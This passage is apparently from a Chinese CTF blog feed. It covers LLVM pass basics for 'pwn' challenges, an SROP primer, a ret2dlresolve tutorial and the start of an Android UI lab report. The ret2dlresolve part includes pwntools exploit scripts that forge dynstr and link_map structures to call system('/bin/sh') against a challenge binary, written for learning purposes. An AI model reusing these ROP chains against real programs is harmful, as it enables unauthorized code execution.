c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br><span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) {}<br></code></pre></td></tr></tbody></table></figure><p>然后声明了一个runOnFunction方法，它覆盖了从FunctionPass继承的抽象虚方法。 这是我们应该做的事情，所以我们只用每个函数的名称打印出我们的消息。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>{<br>    <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">"Hello: "</span>;<br>    <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">'\n'</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  }<br>}; <span class="hljs-comment">// end of struct Hello</span><br>}  <span class="hljs-comment">// end of anonymous namespace</span><br></code></pre></td></tr></tbody></table></figure><p>接着初始化passID。 LLVM使用ID的地址来标识pass，因此初始化值并不重要。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br></code></pre></td></tr></tbody></table></figure><p>最后，我们注册我们的类Hello，给它一个命令行参数“hello”，并命名为“Hello World Pass”。 最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，那么第三个参数设置为true; 如果pass是分析pass，例如支配树pass，则提供true作为第四个参数。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"Hello World Pass"</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Only looks at CFG */</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-literal">false</span> <span class="hljs-comment">/* Analysis Pass */</span>)</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>如果我们想将通道注册为现有管道的一个步骤，则提供了一些扩展点，例如<code>PassManagerBuilder::EP_EarlyAsPossible</code>在任何优化之前应用我们的通道，或者<code>PassManagerBuilder::EP_FullLinkTimeOptimizationLast</code> 在链接时间优化之后应用它。代码如下</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) { PM.add(<span class="hljs-keyword">new</span> Hello()); })</span></span>;<br></code></pre></td></tr></tbody></table></figure><p>现在需要将这个Pass编译成模块，使用如下命令即可</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">clang<span class="hljs-number">-12</span> `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`<br></code></pre></td></tr></tbody></table></figure><p>现在应该会看到LLVMHello.so这个文件，通过官方文档可知需要使用以下命令</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">opt -load LLVMHello.so -hello test.ll<br></code></pre></td></tr></tbody></table></figure><p>这里的 -hello由Hello.cpp中的<code>static RegisterPass&lt;Hello&gt; X</code>参数决定</p><p>但是笔者这里报了一个错<code>Error opening 'LLVMHello.so': LLVMHello.so: cannot open shared object file: No such file or directory</code>，这是因为linux无法在默认地址找到LLVMHello.so，解决很简单`sudo cp LLVMHello.so /lib</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png'><img src="https://s2.loli.net/2023/10/28/XWF4LHKzkSwchIb.png" alt="image.png"></p><p>成功输出test.c所有函数名称</p><h2 id="对第一个LLVM-Pass逆向分析"><a href="#对第一个LLVM-Pass逆向分析" class="headerlink" title="对第一个LLVM Pass逆向分析"></a>对第一个LLVM Pass逆向分析</h2><p>刚刚生成了LLVMHello.so这个pass文件，比赛题和上面也一样，会重写<code>FunctionPass</code>类中的<code>runOnFunction</code>函数，所以我们对上面的示例程序进行逆向分析，看一下虚表位置这样方便比赛的时候确定每个函数的位置</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png'><img src="https://s2.loli.net/2023/10/28/Yi63r1Ju9amMwxf.png" alt="image.png"></p><p>跟进RegisterPass</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png'><img src="https://s2.loli.net/2023/10/28/75lPFTus26yqtnf.png" alt="image.png"></p><p>发现调用了callDefaultCtor进行对象创建，跟进它</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png'><img src="https://s2.loli.net/2023/10/28/LUV5XROSuFNvtMm.png" alt="image.png"></p><p>给Hello对象分配了0x20个空间，跟进Hello</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png'><img src="https://s2.loli.net/2023/10/28/EyKMYARvXJco7gu.png" alt="image.png"></p><p>看到虚表了，直接跟进</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png'><img src="https://s2.loli.net/2023/10/28/uP6tBspbYAe4HwU.png" alt="image.png"></p><p><code>runOnFunction</code>函数位于虚表中的最后一个位置，因为runOnFunction函数被我们重写了，所以它指向的是我们自定义的那个函数，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>收获很大，从编译过程到LLVM，加固了计算机底层的一些知识，知道了LLVM PASS PWN该怎么入手，以前看到LLVM PASS PWN的时候都不知道怎么运行（XD），这里第一篇就结束了，后面会继续更新</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/130702001">https://zhuanlan.zhihu.com/p/130702001</a></p><p><a href="https://zhuanlan.zhihu.com/p/122522485">https://zhuanlan.zhihu.com/p/122522485</a></p><p><a href="https://www.homedt.net/196837.html">https://www.homedt.net/196837.html</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LLVM-PASS-PWN（一）&quot;&gt;&lt;a href=&quot;#LLVM-PASS-PWN（一）&quot; class=&quot;headerlink&quot; title=&quot;LLVM PASS PWN（一）&quot;&gt;&lt;/a&gt;LLVM PASS PWN（一）&lt;/h1&gt;&lt;h2 id=&quot;前置知识简述&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWN（一）" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://kylinxin.github.io/2023/10/25/SROP/"/>
    <id>https://kylinxin.github.io/2023/10/25/SROP/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T10:30:13.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级ROP-SROP"><a href="#高级ROP-SROP" class="headerlink" title="高级ROP-SROP"></a>高级ROP-SROP</h1><p>之前一直没掌握SROP技术，以此篇重新学习一下SROP</p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>在目前的pwntools中已经集成了对于srop的攻击。</p><h3 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h3><p>在汇编代码中看到存在systemcall的时候可以考虑采用该方法进行尝试</p><p>下面给出我们将会用到的64位函数及函数调用号和函数原型</p><table><thead><tr><th>系统调用</th><th>调用号</th><th>函数原型</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>read( int fd, void *buf, size_t count )</td></tr><tr><td>write</td><td>1</td><td>write( int fd, const void *buf, size_t count )</td></tr><tr><td>sigreturn</td><td>15</td><td>int sigreturn( … )</td></tr><tr><td>execve</td><td>59</td><td>execve( const char *filename, char *const argv[], char *const envp[] )</td></tr></tbody></table><p>###使用sigreturn对read函数调用的寄存器进行部署<br>接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。值得高兴的是pwntools中已经有了调用sigreturn的功能，所以在写EXP的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解</p><table><thead><tr><th>寄存器和指令</th><th>存储数据</th></tr></thead><tbody><tr><td>rax</td><td>系统调用号</td></tr><tr><td>rdi</td><td>0</td></tr><tr><td>rsi</td><td>addr</td></tr><tr><td>rdx</td><td>len</td></tr><tr><td>rsp</td><td>addr</td></tr><tr><td>rip</td><td>syscall_ret</td></tr></tbody></table><blockquote><p>首先是rax寄存器中一定是存放read函数的系统调用号啦，因为原汇编代码使用的是syscall，这个不多说了<br>●rdi寄存器作为read函数的一参，0代表标准输入<br>●rsi寄存器作为read函数的二参，里面存放的是前面通过write函数打印出来的新栈顶的地址，也就是说将接收到的信息写到我们前面通过write函数打印的新栈顶的位置<br>●rdx作为read函数的三参写0x400个字节<br>●rsp寄存器需要和rsi保持一致，在写的时候写在rsp指向的位置<br>●rip寄存器指向syscall_ret，确保在read函数寄存器部署成功之后可以直接调用read函数</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高级ROP-SROP&quot;&gt;&lt;a href=&quot;#高级ROP-SROP&quot; class=&quot;headerlink&quot; title=&quot;高级ROP-SROP&quot;&gt;&lt;/a&gt;高级ROP-SROP&lt;/h1&gt;&lt;p&gt;之前一直没掌握SROP技术，以此篇重新学习一下SROP&lt;/p&gt;
&lt;h3 id</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="SROP" scheme="https://kylinxin.github.io/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kylinxin.github.io/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-25T15:14:29.000Z</published>
    <updated>2023-10-25T12:43:55.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>借鉴文档：<a href="https://blog.csdn.net/qq_51868336/article/details/114644569?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjE0OTksImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODIyMTE5OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzNTY3NjEwMX0.6h_vJ55b-Q434hFOdAu0-8iK6sq18c0emOswHSLqfH4">【精选】ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a></p><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在<a href="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020">Linux</a>中，程序使用_dl_runtime_resolve(link_map,reloc_offset)来对动态链接的函数进行重定位。</p><p>而ret2dlresolve攻击的核心就是控制相应的参数及其对应地址的内容，从而控制解析的函数。</p><h3 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h3><p>第一次调用一个函数时，先是到plt表，然后jmp到got表</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png'><img src="https://s2.loli.net/2023/10/25/2gimIN6C7SLXRp3.png" alt="image.png"></p><p>此时got表存的地址是在plt表上</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png'><img src="https://s2.loli.net/2023/10/25/lvKA2cjSYiwhPxW.png" alt="image.png"></p><p>其实也就是jmp got的下一条指令，这里先是push一个数字（该函数在rel.plt上的偏移,reloc_arg，后文会讲到），然后jmp到plt[0] (0x8048380)</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png'><img src="https://s2.loli.net/2023/10/25/4heH2vXBcwJuPVd.png" alt="image.png"></p><p>在plt[0]处先是push got[1]，got[1]就是link_map（链接器的标识信息,后文会讲到），然后jmp到got[2]处，got[2]就是_dl_runtime_resolve函数的地址</p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png'><img src="https://s2.loli.net/2023/10/25/FAk9bBdJD1OQus6.png" alt="image.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png'><img src="https://s2.loli.net/2023/10/25/tdvWZqcRnPQgjHL.png" alt="image.png"></p><p>所以相当于执行了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_runtime_resolve(link_map,reloc_arg)<br></code></pre></td></tr></tbody></table></figure><p>这个函数会完成符号的解析，即将真实的write函数地址写入其GOT表对应的条目中，随后将控制器交给被解析的函数</p><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = ELF(<span class="hljs-string">'./'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br><span class="hljs-comment">#我们攻击的目标，.dynamic中strtab的地址，我们要在此处修改指向fake_dynstr  </span><br>target_addr = <span class="hljs-number">0x600988</span> + <span class="hljs-number">8</span>  <br><span class="hljs-comment">#用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  </span><br><span class="hljs-comment">#plt起始地址</span><br>plt0_load =    <br><span class="hljs-comment">#pop rdi;ret;  </span><br>pop_rdi =  <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi = <br><span class="hljs-comment">#伪造dynstr  </span><br>fake_dynstr = <span class="hljs-string">'\x00libc.so.6\x00stdin\x00system\x00'</span> <span class="hljs-comment">#原本dynstr为\x00libc.so.6\x00stdin\x00strlen\x00'</span><br><span class="hljs-comment">#bss段起始地址</span><br>bss =   <br>offset = <br>payload = flat(<span class="hljs-string">'a'</span> * offset , pop_rdi , <span class="hljs-number">0</span> , pop_rsi , bss , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 将'/bin/sh'以及伪造的strtab写入bss段</span><br>                pop_rdi , <span class="hljs-number">0</span> , pop_rsi , target_addr , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 将.dynamic中的strtab地址改为我们伪造的strtab的地址</span><br>                pop_rdi , bss , plt0_load , <span class="hljs-number">1</span> <span class="hljs-comment"># 调用.dl_fixup,解析strlen函数，由于我们已经在fake_strtab中将strlen替换成system，所以将会解析system函数</span><br><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)<br>r.sendline(payload)  <br><span class="hljs-comment">#发送system的参数以及伪造的strtab</span><br>payload2 = <span class="hljs-string">'/bin/sh'</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x00'</span>) + fake_dynstr  <br>sleep(<span class="hljs-number">1</span>)  <br>r.sendline(payload2)  <br>sleep(<span class="hljs-number">1</span>)  <br><span class="hljs-comment">#修改dynsym里的strtab的地址为我们伪造的dynstr的地址  </span><br>r.sendline(p64(bss + <span class="hljs-number">0x10</span>))  <br>r.interactive()  <br><br></code></pre></td></tr></tbody></table></figure><h3 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL_RELRO"></a>PARTIAL_RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br><span class="hljs-comment">#r = gdb.debug("./parelro_x64",'break main')</span><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = ELF(<span class="hljs-string">'./'</span>)  <br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.31.so'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br>write_got = elf.got[<span class="hljs-string">'write'</span>]  <br>vuln_addr = elf.sym[<span class="hljs-string">'vuln'</span>]  <br>  <br><span class="hljs-comment">#bss  </span><br>bss =   <br>bss_stage = bss + <span class="hljs-number">0x100</span><br>l_addr =  libc.sym[<span class="hljs-string">'system'</span>] -libc.sym[<span class="hljs-string">'write'</span>]  <span class="hljs-comment"># l_addr = -769472, 通常为负数</span><br>  <br>pop_rdi =   <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi =   <br><span class="hljs-comment">#用于解析符号dl_runtime_resolve  </span><br>plt0 = <br>plt_load = plt0 + <span class="hljs-number">6</span>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_Linkmap_payload</span>(<span class="hljs-params">fake_linkmap_addr,known_func_ptr,offset</span>):<br>    <span class="hljs-comment"># &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误</span><br>    linkmap = p64(offset &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))<span class="hljs-comment">#l_addr</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容</span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># 可以为任意值</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># 这里的值就是伪造的.rel.plt的地址</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项</span><br>    linkmap += p64((fake_linkmap_addr + <span class="hljs-number">0x30</span> - offset) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 </span><br>    linkmap += p64(<span class="hljs-number">0x7</span>) <span class="hljs-comment"># Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项</span><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># Rela-&gt;r_addend,任意值都行</span><br><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#l_ns</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># 参考IDA上.dyamisc的结构</span><br>    linkmap += p64(known_func_ptr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8</span><br><br>    linkmap += <span class="hljs-string">b'/bin/sh\x00'</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr) <span class="hljs-comment"># fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x38</span>) <span class="hljs-comment"># fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x8</span>) <span class="hljs-comment"># fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址</span><br>    <span class="hljs-keyword">return</span> linkmap<br><br>fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)<span class="hljs-comment"># 伪造link_map</span><br><br>payload = flat( <span class="hljs-string">'a'</span> * <span class="hljs-number">120</span> ,pop_rdi, <span class="hljs-number">0</span> , pop_rsi , bss_stage , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># 把link_map写到bss段上</span><br>                pop_rsi , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , <span class="hljs-comment"># 使栈十六字节对齐，不然调用不了system</span><br>                pop_rdi , bss_stage + <span class="hljs-number">0x48</span>  , plt_load , bss_stage , <span class="hljs-number">0</span> <span class="hljs-comment"># 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引</span><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)  <br>r.sendline(payload)  <br><br>r.send(fake_link_map) <br><br>r.interactive() <br><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;借鉴文档：&lt;a href=&quot;https://blog.csdn.net/qq_51868336/article/details/114644569?acce</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="ret2dlresolve" scheme="https://kylinxin.github.io/tags/ret2dlresolve/"/>
    
  </entry>
  
  <entry>
    <title>移动开发实验1：类微信界面</title>
    <link href="https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/"/>
    <id>https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/</id>
    <published>2023-10-13T15:14:29.000Z</published>
    <updated>2023-10-13T02:03:10.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AS类微信界面开发"><a href="#AS类微信界面开发" class="headerlink" title="AS类微信界面开发"></a>AS类微信界面开发</h1><h2 id="功能要求"><a href="#功能要求" class="headerlink" title="功能要求"></a>功能要求</h2><p>1.、请根据课程内容设计一个app的门户框架，需要实现3-4个tab切换效果；本功能要求需要的技术为：activity、xml、fragment</p><p>2、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；</p><h2 id="开发技术"><a href="#开发技术" class="headerlink" title="开发技术"></a>开发技术</h2><p>开发工具：as </p><p>版本：API 24 Android 7.0</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>类微信界面主要分为上中下三个部分，其中上下为 top.xml和 bottom.xml 为基础信息显示。</p><p>主界面中间部分由4个页面叠加，在进行选择内容时变换界面</p><p>其中我选择在聊天界面实现列表效果，采用 recycleview</p><h2 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h2><h3 id="1-导入所需图片到drawable目录下"><a href="#1-导入所需图片到drawable目录下" class="headerlink" title="1. 导入所需图片到drawable目录下"></a>1. 导入所需图片到drawable目录下</h3><p class='item-img' data-src='https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png'><img src="https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png" alt="image.png"></p><h3 id="2-布局设计-xml文件编写"><a href="#2-布局设计-xml文件编写" class="headerlink" title="2. 布局设计 xml文件编写"></a>2. 布局设计 xml文件编写</h3><h4 id="标题栏top-xml"><a href="#标题栏top-xml" class="headerlink" title="标题栏top.xml"></a>标题栏top.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png'><img src="https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span 